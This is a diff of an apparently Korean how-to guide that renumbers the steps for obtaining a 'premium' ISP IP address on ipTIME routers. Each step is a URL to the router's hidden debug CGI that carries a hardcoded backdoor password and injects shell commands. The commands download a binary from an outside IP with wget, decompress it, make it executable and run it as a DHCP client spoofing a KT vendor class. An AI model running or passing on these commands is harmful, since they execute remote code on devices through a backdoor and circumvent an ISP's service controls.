@@ -165,12 +165,12 @@ mipsel로 예상되는 기기 : AX2004M, AX2004, AX2002-Mesh, A9004M-X2, A8004T,
 
    mipsel 기기, 미러 다운로드 주소 - http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=wget%20-O%20%2ftmp%2fdhclient.gz%20http%3a%2f%2f168.138.196.144%2fudhcpc_mipsel.gz
    
-4. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=gzip%20-d%20%2ftmp%2fdhclient.gz
-5. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=chmod%20755%20%2ftmp%2fdhclient
-6. 인터넷 설정 정보에서 '연결해제'를 선택합니다
-7. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=%2ftmp%2fdhclient%20-s%20%2fsbin%2fdhcpc.sh%20-i%20eth1%20-p%20%2fvar%2frun%2fdhclient.eth1%20-V%20KT_PR_HH_A_A
-8. 새로운 '외부 IP 주소'를 확인해봅시다. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다
-9. 성공적으로 프리미엄 IP를 취득했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.
+3. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=gzip%20-d%20%2ftmp%2fdhclient.gz
+4. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=chmod%20755%20%2ftmp%2fdhclient
+5. 인터넷 설정 정보에서 '연결해제'를 선택합니다
+6. http://192.168.0.1/sess-bin/d.cgi?act=1&fname=&aaksjdkfj=!@dnjsrurelqjrm*%26&dapply=%20Show%20&cmd=%2ftmp%2fdhclient%20-s%20%2fsbin%2fdhcpc.sh%20-i%20eth1%20-p%20%2fvar%2frun%2fdhclient.eth1%20-V%20KT_PR_HH_A_A
+7. 새로운 '외부 IP 주소'를 확인해봅시다. 다운로드한 데이터를 포함한 변경 사항은 특정 공유기 설정을 변경하거나 재시동되거나 전원이 끊어지면 지워집니다
+8. 성공적으로 프리미엄 IP를 취득했다면 기기 모델명과 펌웨어 버전, 미러 다운로드 주소 사용여부를 3570kgen@naver.com 에 제보하는 것을 고려해보세요.
 
 <a href="https://shop.kt.com/shrt/CCiqOp.do">따라하는 과정에서 발생하는 어려움은 대부분 여기에서 해결할 수 있습니다</a>
 
